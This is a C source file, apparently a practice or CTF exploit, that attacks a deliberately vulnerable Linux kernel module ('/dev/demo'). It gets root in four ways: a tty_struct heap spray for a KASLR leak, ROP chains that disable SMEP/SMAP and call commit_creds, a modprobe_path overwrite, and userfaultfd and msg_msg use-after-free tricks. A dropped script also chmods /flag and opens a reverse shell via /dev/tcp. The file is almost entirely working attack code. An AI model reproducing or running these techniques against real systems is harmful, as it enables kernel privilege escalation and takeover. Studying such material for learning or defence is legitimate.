#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <syscall.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <assert.h>
#include <stdint.h>
#include <errno.h>
#include <poll.h>

#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/ipc.h>

#include "userfaultfd.h"
#include "demo_note.h"

uint64_t prepare_kernel_cred  = 0x00000000000bc7e0;
uint64_t commit_cred          = 0x00000000000bc350;
uint64_t pop_rdi_ret          = 0x00000000000815d0;
uint64_t pop_rsi_ret          = 0x00000000001cc43a;
uint64_t pop_rsp_ret          = 0x000000000014b340;
uint64_t mov_rdi_rax_pop2_ret = 0x0000000000029951;
uint64_t mov_ptr_rdi_rsi_ret  = 0x000000000006df00;
uint64_t swapgs               = 0x000000000006def0;
uint64_t iretq                = 0x000000000003b1e4;
uint64_t modprobe_path        = 0x0000000001663900;
uint64_t mov_cr4_rdi_ret      = 0x00000000000000a9;


uint64_t user_cs, user_ss, user_rflags, user_sp, user_rip;
void spawn_shell(void){
    puts("[+] We're back to userland!");
    uint8_t uid = getuid();
    if(uid == 0){
        printf("[+] UID is: %d\n[+] You just rooted the machine!\n", uid);
    }
    else {
        printf("[-] UID is: %d\n[-] You didn't root the machine unfortunately..\n", uid);
        exit(-1);
    }
    system("cat /flag; /bin/sh");
}

void save_user_state(void){ // save the state of our user context
   __asm__(
    "mov user_cs, cs;"  // user code segment
    "mov user_ss, ss;"  // user stack segment
    "mov user_sp, rsp;" // user stack
    "pushfq;"           // user rflags
    "pop user_rflags;" 
    );
}
int fd;
int open_demo(){
    fd = open("/dev/demo", O_RDWR);
    if(fd < 0){puts("[-] Failed to open /dev/demo"); return -1;}
    return 0;
}

uint64_t get_leak(){
    int pfd[512];
	for(int i = 0; i < 256; ++i){ // spray the heap with tty_struct structs 
        pfd[i] = open( "/dev/ptmx" , O_RDWR | O_NOCTTY ); // tty_struct
        if (pfd[i] == -1)
            puts("[-] Failed to open /dev/ptmx..");
    }
	for(int i = 0; i < 256; ++i){close(pfd[i]);}
    uint64_t leak[64];
    if(fd <= 0){if(open_demo() < 0){return -1;}}
    add_note(fd, 0x2c0); // size of tty_struct
    read_note(fd, 0, leak);
    uint64_t kbase = leak[3] - 0x10a6f20;
    printf("[+] Kernel base: %p\n", kbase);
    
    prepare_kernel_cred  += kbase;
    commit_cred          += kbase;
    pop_rdi_ret          += kbase;
    pop_rsi_ret          += kbase;
    pop_rsp_ret          += kbase;
    mov_rdi_rax_pop2_ret += kbase;
    mov_ptr_rdi_rsi_ret  += kbase;
    swapgs               += kbase;
    iretq                += kbase;
    modprobe_path        += kbase;
    return kbase;
}
int exp_ret2usr(){ // https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/
    user_rip = (uint64_t) spawn_shell;
    uint64_t stage1[0x100], stage2[0x100];
    uint64_t kbase;
    int i = 0;

    if((kbase = get_leak()) <= 0){puts("[-] Memory leak error.."); return -1;}


    /* we have to use ROP cause we can't execute from userland (SMEP) */
    /* we have to disable SMAP so we could jump back to usermode */
    stage1[i++] = pop_rdi_ret;     
    stage1[i++] = 0x6f0;           // disable smap & smep
    stage1[i++] = mov_cr4_rdi_ret;
    stage1[i++] = pop_rsp_ret;
    stage1[i++] = stage2;          // pivot the stack to the user buffer stage2 

    i = 0;
    stage2[i++] = pop_rdi_ret;
    stage2[i++] = 0x0;
    stage2[i++] = prepare_kernel_cred;
    stage2[i++] = mov_rdi_rax_pop2_ret;
    stage2[i++] = 0x0;
    stage2[i++] = 0x0;
    stage2[i++] = commit_cred; 
    stage2[i++] = swapgs;           // GS segment usually used for the Thread Local Storage
    stage2[i++] = iretq;
    stage2[i++] = user_rip;
    stage2[i++] = user_cs;
    stage2[i++] = user_rflags;
    stage2[i++] = user_sp;
    stage2[i++] = user_ss;
    
    demo_overflow(fd, (char *)stage1);
    return 0;
}
void modprobe_script(){
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake\nchmod +x /tmp/fake"); // unknown file type so modprobe_path file would execute
    puts("[+] modprobe_path trigger was created!");
    
    system("echo -ne '#!/bin/sh\nchmod 777 /flag\nbash -i >& /dev/tcp/127.0.0.1/1337 0>&1' > /tmp/x\nchmod +x /tmp/x");
    puts("[+] modprobe_path script was created!");

    system("/tmp/fake");
    puts("[+] Run trigger file"); 
    puts("[+] Get flag: ");
    system("cat /flag");
}
int exp_modprobe_path(){ // https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/
    user_rip = (uint64_t) modprobe_script;
    uint64_t stage1[0x100];
    uint64_t kbase;
    if((kbase = get_leak()) <= 0){puts("[-] Memory leak error.."); return -1;}

    /* we have to use ROP cause we can't execute from userland (SMEP) */
    /* we have to disable SMAP so we could jump back to usermode */
    int i = 0;
    stage1[i++] = pop_rdi_ret;     
    stage1[i++] = 0x6f0;           // disable smap & smep
    stage1[i++] = mov_cr4_rdi_ret;
    stage1[i++] = pop_rdi_ret;
    stage1[i++] = modprobe_path;
    stage1[i++] = pop_rsi_ret;
    stage1[i++] = 0x782f706d742f;   // "/tmp/x"
    stage1[i++] = mov_ptr_rdi_rsi_ret;
    stage1[i++] = swapgs;           // GS segment usually used for the Thread Local Storage
    stage1[i++] = iretq;
    stage1[i++] = user_rip;
    stage1[i++] = user_cs;
    stage1[i++] = user_rflags;
    stage1[i++] = user_sp;
    stage1[i++] = user_ss;          
    demo_overflow(fd, (char *)stage1);
    return 0;
}

uint64_t uffd;
uint64_t fault_addr;
void userfaultfd_handler(){
    struct uffd_msg msg;
    struct pollfd pollfd;
    struct uffdio_copy uffdio_copy;
    uint64_t page;
    pollfd.fd     = uffd;
    pollfd.events = POLL_IN; // if data was recieved to read in the poll
    if((page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == MAP_FAILED){puts("[-] Failed to map userfaultfd copy page area.."); return -1;} 
    for(;;){
        if(poll(&pollfd, 1, -1) == -1){puts("[-] Error failed to start the event poll.."); return -1;}    
        if(read(uffd, &msg, sizeof(msg)) <= 0){puts("[-] Error failed to read userfaultfd msg or EOF.."); return -1;}
        if(msg.event != UFFD_EVENT_PAGEFAULT){puts("[-] Error unexpected userfaultfd event.."); return -1;}
        if(msg.arg.pagefault.flags & UFFD_PAGEFAULT_FLAG_WRITE){puts("Write fault");}
        else{puts("[+] Read fault..\n[+] Just before you go.. here's a root for you :D"); edit_note(fd, 0, ":D");} // commit_creds(prepare_kernel_cred(0))
        /* copy new page to fault_addr, so we can continue execution */
        uffdio_copy.src  = page; 
        uffdio_copy.dst  = fault_addr; // & ~(PAGE_SIZE-1) // alignment
        uffdio_copy.len = PAGE_SIZE;
        uffdio_copy.copy = 0;
        uffdio_copy.mode = 0;
        if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1){puts("[-] Error failed to copy userfaultfd page.."); return -1;}
    }
    
}
int exp_userfaultfd(){ // http://brieflyx.me/2020/linux-tools/userfaultfd-internals/
    /* register user fault */   
    pthread_t thread;
    struct uffdio_api uffd_api;
    struct uffdio_register uffd_register;
    uffd_api.api              = UFFD_API;
    uffd_api.features         = 0; 
    if((uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK)) == -1){puts("[-] Error failed to perform the userfaultfd syscall.."); return -1;}  
    if(ioctl(uffd, UFFDIO_API, &uffd_api) == -1) {puts("[-] Error failed to set UFFD API.."); return -1;}
    if((fault_addr = mmap(NULL, PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == MAP_FAILED){puts("[-] Error failed to map userfaultfd area.."); return -1;}
    uffd_register.range.start = fault_addr;
    uffd_register.range.len   = PAGE_SIZE * 2;
    uffd_register.mode        = UFFDIO_REGISTER_MODE_MISSING; // handle missing pages (pages that never faulted before)
    if(ioctl(uffd, UFFDIO_REGISTER, &uffd_register) == -1){puts("[-] Error failed to register the UFFD.."); return -1;}
    if(pthread_create(&thread, NULL, userfaultfd_handler, NULL)){puts("[-] Error failed to create a the userfaultfd handler thread.."); return -1;}
    /* trigger the bug */
    uint64_t kbase;
    if((kbase = get_leak()) <= 0){puts("[-] Memory leak error.."); return -1;}
    add_note(fd, 0x10);
    edit_note(fd, 0, "QQ");
    demo_userfaultfd(fd, fault_addr, 0); // we'll get a fault just before -> copy_from_user(tmp, data, sizeof(tmp))... then we could do edit_note(fd, 0, ":D") and continue as root  
    spawn_shell();
    return 0;
}


int exp_msg_msg(){
    int qid;
    uint64_t kbase;
    if((kbase = get_leak()) <= 0){puts("[-] Memory leak error.."); return -1;}
    add_note(fd, 0x10); // alloc
    demo_msg_msg(fd, 1); // UAF -> free 
    if((qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1){puts("[-] Failed to create msg queue.."); return -1;}
    
    /* send a fake note over the msg queue */
    fake_note.data = modprobe_path;
    fake_note.size = sizeof(fake_note);
    msgbuf.mtype = 1; //
    memcpy(msgbuf.mtext, ((uint64_t *)&fake_note), fake_note.size); // only copy the note data  
    if(msgsnd(qid, &msgbuf, fake_note.size, 0) == -1){puts("[-] Failed to send msg.."); return -1;}
    
    uint64_t buf[0x100];
    memset(buf, 0, 0x10);
    read_note(fd, 1, buf);
    printf("[+] Current modprobe_path is: %s\n", buf);
    
    edit_note(fd, 1, "/tmp/x");

    modprobe_script();

    return 0;
} 

int main(int argc, char **argv){
    if(argc < 2){printf("[-] Need demo.ko module base addrress!\nUsage: %s [base]\n", argv[0]);}
    uint64_t demo_base = strtoull(argv[1], 0, 16);
    mov_cr4_rdi_ret += demo_base;
    printf("[+] Module base address is set to: %p\n", demo_base);
    save_user_state();
    //if(exp_ret2usr() < 0){puts("[-] ret2usr exploit failed!\n"); return -1;}
    //if(exp_modprobe_path() < 0){puts("[-] modprobe_path exploit failed!\n"); return -1;}
    //if(exp_userfaultfd() < 0){puts("[-] userfaultfd exploit failed!"); return -1;}
    if(exp_msg_msg() < 0){puts("[-] msg_msg exploit failed!"); return -1;}
      
    return 0;
}